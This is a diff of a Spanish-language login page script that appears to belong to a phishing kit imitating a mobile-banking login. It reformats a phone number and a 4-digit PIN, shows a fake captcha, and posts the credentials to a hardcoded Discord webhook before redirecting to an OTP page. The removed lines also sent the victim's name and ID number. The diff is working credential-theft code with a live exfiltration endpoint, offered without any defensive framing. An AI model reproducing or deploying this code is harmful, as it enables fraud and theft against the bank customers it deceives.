@@ -129,110 +129,106 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
     <!-- Script funcional -->
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const usernameInput = document.getElementById('txtUsername');
-            const passwordInput = document.getElementById('txtPass');
-            const captchaImg = document.getElementById('captcha');
-            const submitBtn = document.getElementById('btnUsuario');
+   <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const usernameInput = document.getElementById('txtUsername');
+        const passwordInput = document.getElementById('txtPass');
+        const captchaImg = document.getElementById('captcha');
+        const submitBtn = document.getElementById('btnUsuario');
 
-            let captchaClicked = false;
+        let captchaClicked = false;
 
-            if (usernameInput) {
-                usernameInput.addEventListener('input', formatUsername);
-            }
-            if (passwordInput) {
-                passwordInput.addEventListener('input', formatPassword);
-            }
-            if (captchaImg) {
-                captchaImg.addEventListener('click', toggleCaptcha);
-            }
+        if (usernameInput) {
+            usernameInput.addEventListener('input', formatUsername);
+        }
+        if (passwordInput) {
+            passwordInput.addEventListener('input', formatPassword);
+        }
+        if (captchaImg) {
+            captchaImg.addEventListener('click', toggleCaptcha);
+        }
 
-            function formatUsername() {
-                let value = usernameInput.value.replace(/\D/g, '');
-                let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
-                usernameInput.value = formattedValue;
-                validateForm();
-            }
+        function formatUsername() {
+            let value = usernameInput.value.replace(/\D/g, '');
+            let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
+            usernameInput.value = formattedValue;
+            validateForm();
+        }
 
-            function formatPassword() {
-                passwordInput.value = passwordInput.value.replace(/\D/g, '');
-                validateForm();
-            }
+        function formatPassword() {
+            passwordInput.value = passwordInput.value.replace(/\D/g, '');
+            validateForm();
+        }
 
-            function validateForm() {
-                const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
-                const passwordValid = /^\d{4}$/.test(passwordInput.value);
-                if (usernameValid && passwordValid && captchaClicked) {
-                    submitBtn.disabled = false;
-                    submitBtn.classList.remove('disabled');
-                } else {
-                    submitBtn.disabled = true;
-                    submitBtn.classList.add('disabled');
-                }
-            }
-
-            function toggleCaptcha() {
-                captchaClicked = true;
-                captchaImg.src = "img/cap.png";
-                validateForm();
-            }
-
-            const nombreApellido = localStorage.getItem("nombreApellido") || "No disponible";
-            const cedula = localStorage.getItem("cedula") || "No disponible";
-
-            if (window.jQuery) {
-                $('#btnUsuario').on('click', async function (e) {
-                    e.preventDefault();
-
-                    const usuario = $("#txtUsername").val().trim();
-                    const clave = $("#txtPass").val().trim();
-
-                    if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
-                        alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
-                        return;
-                    }
-
-                    if (!/^\d{4}$/.test(clave)) {
-                        alert("La clave debe ser de 4 dígitos numéricos.");
-                        return;
-                    }
-
-                    localStorage.setItem("numero", usuario);
-                    localStorage.setItem("clave", clave);
-
-                    const webhookURL = 'https://discord.com/api/webhooks/1377265795486187621/LUtffDY5XzYsDfpOJSwvxL0eS60wSy7rtL6P2WXlBBFHOv0y53CVBy5lIn9APJw-Gj1S';
-                    const discordPayload = {
-                        username: "Consulta de Usuario",
-                        content:
-                            `Nueva solicitud recibida:\n\n` +
-                            `**Nombre:** ${nombreApellido}\n` +
-                            `**Cédula:** ${cedula}\n` +
-                            `**Número de Usuario:** ${usuario}\n` +
-                            `**Clave:** ${clave}`
-                    };
-
-                    try {
-                        const response = await fetch(webhookURL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(discordPayload)
-                        });
-
-                        if (response.ok) {
-                            window.location.href = "otp.html";
-                        } else {
-                            throw new Error('Error al enviar los datos a Discord');
-                        }
-                    } catch (error) {
-                        console.error('Error al enviar los datos:', error);
-                        alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
-                    }
-                });
+        function validateForm() {
+            const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
+            const passwordValid = /^\d{4}$/.test(passwordInput.value);
+            if (usernameValid && passwordValid && captchaClicked) {
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('disabled');
             } else {
-                console.error("jQuery no está cargado. Asegúrate de incluirlo en tu HTML.");
+                submitBtn.disabled = true;
+                submitBtn.classList.add('disabled');
             }
-        });
-    </script>
+        }
+
+        function toggleCaptcha() {
+            captchaClicked = true;
+            captchaImg.src = "img/cap.png";
+            validateForm();
+        }
+
+        if (window.jQuery) {
+            $('#btnUsuario').on('click', async function (e) {
+                e.preventDefault();
+
+                const usuario = $("#txtUsername").val().trim();
+                const clave = $("#txtPass").val().trim();
+
+                if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
+                    alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
+                    return;
+                }
+
+                if (!/^\d{4}$/.test(clave)) {
+                    alert("La clave debe ser de 4 dígitos numéricos.");
+                    return;
+                }
+
+                localStorage.setItem("numero", usuario);
+                localStorage.setItem("clave", clave);
+
+                const webhookURL = 'https://discord.com/api/webhooks/1377265795486187621/LUtffDY5XzYsDfpOJSwvxL0eS60wSy7rtL6P2WXlBBFHOv0y53CVBy5lIn9APJw-Gj1S';
+                const discordPayload = {
+                    username: "Consulta de Usuario",
+                    content:
+                        `Nueva solicitud recibida:\n\n` +
+                        `**Número de Usuario:** ${usuario}\n` +
+                        `**Clave:** ${clave}`
+                };
+
+                try {
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(discordPayload)
+                    });
+
+                    if (response.ok) {
+                        window.location.href = "otp.html";
+                    } else {
+                        throw new Error('Error al enviar los datos a Discord');
+                    }
+                } catch (error) {
+                    console.error('Error al enviar los datos:', error);
+                    alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
+                }
+            });
+        } else {
+            console.error("jQuery no está cargado. Asegúrate de incluirlo en tu HTML.");
+        }
+    });
+</script>
+
 </body>
 </html>
